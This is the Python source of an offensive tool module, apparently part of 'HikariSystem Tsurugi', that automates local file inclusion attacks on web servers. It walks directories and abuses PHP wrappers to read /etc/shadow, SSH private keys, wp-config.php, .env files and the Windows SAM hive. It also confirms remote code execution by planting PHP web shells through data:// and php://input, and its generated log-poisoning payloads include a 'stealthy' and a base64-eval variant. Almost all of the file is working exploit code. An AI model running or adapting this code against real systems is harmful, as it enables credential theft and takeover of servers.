# HikariSystem Tsurugi/modules/lfi_exploiter.py
"""
LFI EXPLOITATION MODULE - From detection to RCE.
File reading, log poisoning, and shell upload.

Features:
- Auto-read interesting files
- PHP filter bypasses
- Log poisoning â†’ RCE chains
- Proc/self/environ exploitation
- Wrapper abuse (data://, expect://)
"""
import base64
from typing import List, Optional, Dict, Tuple
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
from dataclasses import dataclass, field
from core.ui import console, log_info, log_success, log_warning, log_error
from core.logger import save_loot
from core.requester import TsurugiSession
from rich.panel import Panel
from rich.table import Table


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
#  INTERESTING FILES
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

INTERESTING_FILES = {
    "linux": [
        # System files
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/etc/hostname",
        "/etc/issue",
        # Process info
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/proc/self/status",
        "/proc/version",
        # Apache logs
        "/var/log/apache2/access.log",
        "/var/log/apache2/error.log",
        "/var/log/apache/access.log",
        "/var/log/httpd/access_log",
        # Nginx logs
        "/var/log/nginx/access.log",
        "/var/log/nginx/error.log",
        # PHP
        "/etc/php/7.4/apache2/php.ini",
        "/etc/php.ini",
        # SSH
        "/root/.ssh/id_rsa",
        "/root/.ssh/authorized_keys",
        "/home/*/.ssh/id_rsa",
        # Web configs
        "/var/www/html/.htaccess",
        "/var/www/html/config.php",
        "/var/www/html/wp-config.php",
        "/var/www/html/.env",
    ],
    "windows": [
        "C:\\Windows\\win.ini",
        "C:\\Windows\\system.ini",
        "C:\\Windows\\System32\\config\\SAM",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "C:\\inetpub\\logs\\LogFiles\\W3SVC1\\u_ex*.log",
        "C:\\xampp\\apache\\logs\\access.log",
        "C:\\xampp\\apache\\logs\\error.log",
        "C:\\xampp\\htdocs\\config.php",
    ]
}


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
#  PHP WRAPPERS
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

PHP_WRAPPERS = {
    "base64_filter": "php://filter/convert.base64-encode/resource={file}",
    "rot13_filter": "php://filter/read=string.rot13/resource={file}",
    "zlib_filter": "php://filter/zlib.deflate/convert.base64-encode/resource={file}",
    "data_shell": "data://text/plain;base64,{payload}",
    "input_shell": "php://input",
    "expect_shell": "expect://{command}",
}


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
#  RESULTS
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

@dataclass
class LFIResult:
    """LFI exploitation result."""
    vulnerable: bool = False
    files_read: Dict[str, str] = field(default_factory=dict)
    rce_possible: bool = False
    rce_method: str = None
    shell_payload: str = None


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
#  CORE FUNCTIONS
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def read_file_via_lfi(url: str, param: str, filepath: str,
                       requester: TsurugiSession, use_wrapper: bool = True) -> Optional[str]:
    """
    Attempt to read a file via LFI.
    
    Args:
        url: Vulnerable URL
        param: Vulnerable parameter
        filepath: File path to read
        requester: HTTP session
        use_wrapper: Use PHP filter wrapper
        
    Returns:
        File contents or None
    """
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    payloads = []
    
    if use_wrapper:
        # Try base64 filter first (best for PHP files)
        payloads.append(PHP_WRAPPERS["base64_filter"].format(file=filepath))
        payloads.append(PHP_WRAPPERS["rot13_filter"].format(file=filepath))
    
    # Direct path
    payloads.append(filepath)
    
    # With traversal
    for depth in range(1, 10):
        traversal = "../" * depth
        payloads.append(f"{traversal}{filepath.lstrip('/')}")
    
    for payload in payloads:
        test_params = params.copy()
        test_params[param] = [payload]
        test_url = urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, urlencode(test_params, doseq=True), parsed.fragment
        ))
        
        resp = requester.get(test_url, timeout=10)
        
        if resp and resp.status_code == 200:
            content = resp.text
            
            # Check for PHP filter base64 output
            if "php://filter" in payload and "base64" in payload:
                # Try to extract and decode base64
                import re
                # Look for base64 content
                b64_pattern = r'[A-Za-z0-9+/]{50,}={0,2}'
                matches = re.findall(b64_pattern, content)
                
                for match in matches:
                    try:
                        decoded = base64.b64decode(match).decode('utf-8', errors='ignore')
                        if len(decoded) > 10:
                            return decoded
                    except:
                        pass
            
            # Direct file read indicators
            file_markers = {
                "/etc/passwd": ["root:", "bin:x:", "nobody:"],
                "/etc/shadow": ["root:", "$6$", "$y$"],
                "/proc/self/environ": ["PATH=", "HOME=", "USER="],
                "win.ini": ["[fonts]", "[extensions]"],
            }
            
            for marker_file, markers in file_markers.items():
                if marker_file in filepath:
                    for marker in markers:
                        if marker in content:
                            return content
            
            # For other files, check if content looks like file content
            if len(content) > 50 and content != requester.get(url).text:
                return content
    
    return None


def test_log_poisoning(url: str, param: str, requester: TsurugiSession) -> Tuple[bool, str]:
    """
    Test for log poisoning possibility.
    
    Returns:
        (is_possible, log_path)
    """
    log_paths = [
        "/var/log/apache2/access.log",
        "/var/log/apache/access.log",
        "/var/log/httpd/access_log",
        "/var/log/nginx/access.log",
        "/proc/self/fd/1",
    ]
    
    for log_path in log_paths:
        content = read_file_via_lfi(url, param, log_path, requester, use_wrapper=False)
        
        if content and ("GET" in content or "POST" in content or "HTTP" in content):
            return True, log_path
    
    return False, None


def test_rce_wrappers(url: str, param: str, requester: TsurugiSession) -> Tuple[bool, str, str]:
    """
    Test for RCE via PHP wrappers.
    
    Returns:
        (is_possible, method, payload)
    """
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    # Test data:// wrapper
    test_code = "<?php echo 'TSURUGI_RCE_TEST'; ?>"
    encoded = base64.b64encode(test_code.encode()).decode()
    data_payload = f"data://text/plain;base64,{encoded}"
    
    test_params = params.copy()
    test_params[param] = [data_payload]
    test_url = urlunparse((
        parsed.scheme, parsed.netloc, parsed.path,
        parsed.params, urlencode(test_params, doseq=True), parsed.fragment
    ))
    
    resp = requester.get(test_url, timeout=10)
    if resp and "TSURUGI_RCE_TEST" in resp.text:
        shell_code = "<?php system($_GET['cmd']); ?>"
        shell_encoded = base64.b64encode(shell_code.encode()).decode()
        shell_payload = f"data://text/plain;base64,{shell_encoded}"
        return True, "data://", shell_payload
    
    # Test php://input
    test_params[param] = ["php://input"]
    test_url = urlunparse((
        parsed.scheme, parsed.netloc, parsed.path,
        parsed.params, urlencode(test_params, doseq=True), parsed.fragment
    ))
    
    resp = requester.post(test_url, data=test_code, timeout=10)
    if resp and "TSURUGI_RCE_TEST" in resp.text:
        return True, "php://input", "<?php system($_POST['cmd']); ?>"
    
    return False, None, None


def generate_log_poison_payload(shell_type: str = "simple") -> str:
    """Generate log poisoning payload for User-Agent."""
    payloads = {
        "simple": "<?php system($_GET['cmd']); ?>",
        "eval": "<?php eval($_GET['c']); ?>",
        "stealthy": "<?php if(isset($_GET['x'])){system($_GET['x']);} ?>",
        "base64": "<?php eval(base64_decode($_GET['e'])); ?>",
    }
    return payloads.get(shell_type, payloads["simple"])


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
#  MAIN EXPLOIT
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def run_lfi_exploit(url: str, param: str = None, cookie: str = None,
                    proxy: str = None, read_file: str = None,
                    auto_read: bool = True, test_rce: bool = True) -> LFIResult:
    """
    Run LFI exploitation.
    
    Args:
        url: Target URL with parameters
        param: Vulnerable parameter
        cookie: Session cookie
        proxy: Proxy URL
        read_file: Specific file to read
        auto_read: Automatically try to read interesting files
        test_rce: Test for RCE possibilities
        
    Returns:
        LFIResult with findings
    """
    console.print(f"\n[bold red][*] LFI EXPLOITER[/bold red] â†’ [yellow]{url}[/yellow]")
    
    result = LFIResult()
    requester = TsurugiSession(cookie_string=cookie, proxy=proxy)
    
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    if not params:
        log_error("No parameters found in URL.")
        return result
    
    test_params = [param] if param else list(params.keys())
    
    for test_param in test_params:
        console.print(f"\n[cyan]Testing:[/cyan] [bold]{test_param}[/bold]")
        
        # Phase 1: Confirm LFI
        log_info("Phase 1: Confirming LFI...")
        
        test_content = read_file_via_lfi(url, test_param, "/etc/passwd", requester)
        
        if test_content and "root:" in test_content:
            result.vulnerable = True
            result.files_read["/etc/passwd"] = test_content
            
            console.print(Panel(
                "[bold green]LFI CONFIRMED[/bold green]\n"
                f"Successfully read /etc/passwd",
                title="âœ“ Vulnerable",
                border_style="green"
            ))
            
            # Show passwd content
            console.print("[dim]Content preview:[/dim]")
            for line in test_content.split('\n')[:5]:
                console.print(f"  {line}")
        else:
            # Try Windows
            test_content = read_file_via_lfi(url, test_param, "C:\\Windows\\win.ini", requester)
            if test_content and "[fonts]" in test_content.lower():
                result.vulnerable = True
                result.files_read["C:\\Windows\\win.ini"] = test_content
        
        if not result.vulnerable:
            continue
        
        # Phase 2: Read interesting files
        if auto_read:
            log_info("Phase 2: Reading interesting files...")
            
            os_files = INTERESTING_FILES["linux"] if "passwd" in str(result.files_read) else INTERESTING_FILES["windows"]
            
            for filepath in os_files[:15]:  # Limit
                if filepath in result.files_read:
                    continue
                
                content = read_file_via_lfi(url, test_param, filepath, requester)
                if content:
                    result.files_read[filepath] = content
                    console.print(f"  [green]âœ“[/green] {filepath}")
        
        # Phase 3: Specific file
        if read_file:
            log_info(f"Phase 3: Reading {read_file}...")
            content = read_file_via_lfi(url, test_param, read_file, requester)
            if content:
                result.files_read[read_file] = content
                console.print(Panel(content[:1000], title=f"Contents: {read_file}"))
        
        # Phase 4: Test RCE
        if test_rce:
            log_info("Phase 4: Testing RCE possibilities...")
            
            # Test wrappers
            rce_possible, method, payload = test_rce_wrappers(url, test_param, requester)
            
            if rce_possible:
                result.rce_possible = True
                result.rce_method = method
                result.shell_payload = payload
                
                console.print(Panel(
                    f"[bold red]RCE CONFIRMED via {method}[/bold red]\n\n"
                    f"[bold]Shell URL:[/bold]\n"
                    f"{url.replace(params[test_param][0], quote(payload))}&cmd=id",
                    title="ðŸ”¥ REMOTE CODE EXECUTION",
                    border_style="red"
                ))
            else:
                # Test log poisoning
                log_possible, log_path = test_log_poisoning(url, test_param, requester)
                
                if log_possible:
                    result.rce_possible = True
                    result.rce_method = "log_poisoning"
                    result.shell_payload = generate_log_poison_payload()
                    
                    console.print(Panel(
                        f"[bold yellow]LOG POISONING POSSIBLE[/bold yellow]\n\n"
                        f"[bold]Log Path:[/bold] {log_path}\n"
                        f"[bold]Inject in User-Agent:[/bold]\n"
                        f"  {result.shell_payload}\n\n"
                        f"[bold]Then access:[/bold]\n"
                        f"  {url}&cmd=id",
                        title="âš  Potential RCE",
                        border_style="yellow"
                    ))
        
        break  # Found vulnerable param
    
    # Summary
    if result.vulnerable:
        summary_table = Table(title="LFI Exploitation Results")
        summary_table.add_column("Property", style="cyan")
        summary_table.add_column("Value", style="green")
        summary_table.add_row("Files Read", str(len(result.files_read)))
        summary_table.add_row("RCE Possible", "Yes" if result.rce_possible else "No")
        if result.rce_possible:
            summary_table.add_row("RCE Method", result.rce_method)
        console.print(summary_table)
        
        save_loot("lfi_exploit", url, {
            "files_read": list(result.files_read.keys()),
            "rce_possible": result.rce_possible,
            "rce_method": result.rce_method,
        })
    else:
        console.print("\n[yellow]No exploitable LFI found.[/yellow]")
    
    return result
